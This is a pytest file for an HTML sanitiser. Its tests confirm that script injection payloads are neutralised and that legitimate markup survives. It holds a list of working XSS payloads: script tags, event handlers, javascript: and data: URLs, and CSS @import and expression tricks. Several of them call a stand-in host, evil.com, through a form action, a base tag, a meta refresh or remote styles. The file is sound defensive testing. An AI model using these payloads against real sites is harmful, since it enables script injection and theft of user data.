"""HTML sanitiser tests.

The brief requires that generated HTML be treated as untrusted and that a
script-injection payload be provably inert. These tests are that proof.

Two of these cases are regressions from bugs found during development, kept
because they are exactly the kind of thing that silently comes back:

  - `@import` survived an earlier version of the CSS filter, because the filter
    split declarations on "}" and an at-rule is terminated by ";".
  - `<meta http-equiv="refresh">` had its http-equiv stripped but kept its
    `content`, leaving an attacker-supplied URL in the output.
"""

from __future__ import annotations

import pytest

from app.core.sanitize import markdown_is_safe, sanitize_html

# Every payload must be neutralised. Each entry is (name, html, forbidden
# substrings that must NOT appear in the output).
XSS_PAYLOADS = [
    ("plain_script", "<div>ok</div><script>alert(1)</script>", ["script", "alert(1)"]),
    ("nested_script", "<scr<script>ipt>alert(1)</script>", ["<script"]),
    ("event_handler", '<div onclick="alert(1)">x</div>', ["onclick"]),
    ("novel_event_handler", '<p onfuturething="alert(1)">x</p>', ["onfuturething"]),
    ("js_href", '<a href="javascript:alert(1)">go</a>', ["javascript:"]),
    ("entity_encoded_scheme", '<a href="java&#9;script:alert(1)">go</a>', ["javascript:"]),
    ("literal_tab_scheme", '<a href="java\tscript:alert(1)">go</a>', ["javascript:"]),
    (
        "data_html_href",
        '<a href="data:text/html,<script>alert(1)</script>">x</a>',
        ["data:text/html"],
    ),
    ("vbscript_href", '<a href="vbscript:msgbox(1)">x</a>', ["vbscript"]),
    ("iframe", '<iframe src="//evil.com"></iframe>', ["<iframe", "evil.com"]),
    ("svg_onload", '<svg onload="alert(1)"></svg>', ["onload", "<svg"]),
    ("img_onerror", '<img src=x onerror="alert(1)">', ["onerror"]),
    ("form_exfiltration", '<form action="//evil.com"><input name=p></form>', ["<form", "evil.com"]),
    ("object_embed", '<object data="x.swf"></object>', ["<object"]),
    ("base_tag", '<base href="//evil.com/">', ["<base", "evil.com"]),
    ("link_stylesheet", '<link rel=stylesheet href="//evil.com/x.css">', ["<link", "evil.com"]),
    ("cdata_smuggling", "<![CDATA[<script>alert(1)</script>]]>", ["<script"]),
    ("conditional_comment", "<!--[if IE]><script>alert(1)</script><![endif]-->", ["<script"]),
    ("css_expression", "<style>body{width:expression(alert(1))}</style>", ["expression("]),
    ("css_remote_url", "<style>body{background:url(//evil.com/x.png)}</style>", ["evil.com"]),
    # Regression: at-rules terminate on ";", not "}".
    (
        "css_import",
        '<style>@import url("//evil.com");p{color:blue}</style>',
        ["@import", "evil.com"],
    ),
    ("css_import_bare", "<style>@import //evil.com; p{color:red}</style>", ["@import", "evil.com"]),
    ("css_moz_binding", "<style>a{-moz-binding:url(//evil.com/x.xml)}</style>", ["moz-binding"]),
    ("style_attr_js", '<div style="background:url(javascript:alert(1))">x</div>', ["javascript:"]),
    # Regression: http-equiv stripped but content retained leaked the URL.
    (
        "meta_refresh",
        '<meta http-equiv="refresh" content="0;url=//evil.com">',
        ["http-equiv", "evil.com"],
    ),
]


@pytest.mark.parametrize("name,payload,forbidden", XSS_PAYLOADS, ids=[p[0] for p in XSS_PAYLOADS])
def test_xss_payload_is_neutralised(name: str, payload: str, forbidden: list[str]) -> None:
    clean, report = sanitize_html(payload)
    lowered = clean.lower()

    for needle in forbidden:
        assert needle.lower() not in lowered, (
            f"{name}: '{needle}' survived sanitisation.\nOutput: {clean}"
        )

    assert not report.is_clean, f"{name}: sanitiser should have reported a removal"


def test_legitimate_document_survives_intact() -> None:
    """Sanitising must not be so aggressive that real documents are destroyed."""
    source = (
        "<h1>Growth Frameworks</h1>"
        "<style>h1{color:#111;font-size:2rem}</style>"
        "<p>A <strong>bold</strong> claim with <em>emphasis</em>.</p>"
        "<table><thead><tr><th>Metric</th></tr></thead>"
        "<tbody><tr><td>Retention</td></tr></tbody></table>"
        "<ul><li>One</li><li>Two</li></ul>"
        '<a href="https://www.youtube.com/watch?v=abc&t=30s">Source</a>'
    )
    clean, _ = sanitize_html(source)

    for expected in [
        "<h1>", "Growth Frameworks", "<style>", "color:#111",
        "<strong>", "<table>", "<th>", "<li>",
        "https://www.youtube.com/watch?v=abc&amp;t=30s",
    ]:
        assert expected in clean, f"legitimate content lost: {expected}\nOutput: {clean}"


def test_target_blank_gets_noopener() -> None:
    """target=_blank without noopener leaks a window handle to the opened page."""
    clean, _ = sanitize_html('<a href="https://ok.com" target="_blank">x</a>')
    assert 'rel="noopener noreferrer"' in clean


def test_relative_and_anchor_links_allowed() -> None:
    clean, _ = sanitize_html('<a href="#section">jump</a><a href="/local">local</a>')
    assert 'href="#section"' in clean
    assert 'href="/local"' in clean


def test_unknown_tag_drops_tag_but_keeps_text() -> None:
    """Unrecognised markup should not silently delete the user's content."""
    clean, _ = sanitize_html("<marquee>important text</marquee>")
    assert "important text" in clean
    assert "<marquee" not in clean.lower()


def test_malformed_html_does_not_raise() -> None:
    """The sanitiser accepts arbitrary text — that is its entire job."""
    for junk in ["<<<>>>", "<div><span>unclosed", "not html at all", "", "<a href=>"]:
        clean, _ = sanitize_html(junk)
        assert isinstance(clean, str)


def test_unclosed_tags_are_balanced() -> None:
    clean, _ = sanitize_html("<div><p>text")
    assert clean.count("<div") == clean.count("</div")
    assert clean.count("<p") == clean.count("</p")


def test_markdown_html_stripping() -> None:
    """Raw HTML embedded in Markdown must be neutralised too."""
    cleaned, report = markdown_is_safe(
        "# Title\n\n<script>alert(1)</script>\n\nNormal **text**.\n"
    )
    assert "<script" not in cleaned.lower()
    assert "# Title" in cleaned
    assert "**text**" in cleaned
    assert not report.is_clean


def test_sanitize_report_records_what_was_removed() -> None:
    """The report drives the UI's 'unsafe markup removed' notice, so it must
    actually describe the removals rather than just flagging a boolean."""
    _, report = sanitize_html('<script>x</script><div onclick="y">z</div>')
    assert any("script" in item for item in report.removed)
    assert any("onclick" in item for item in report.removed)
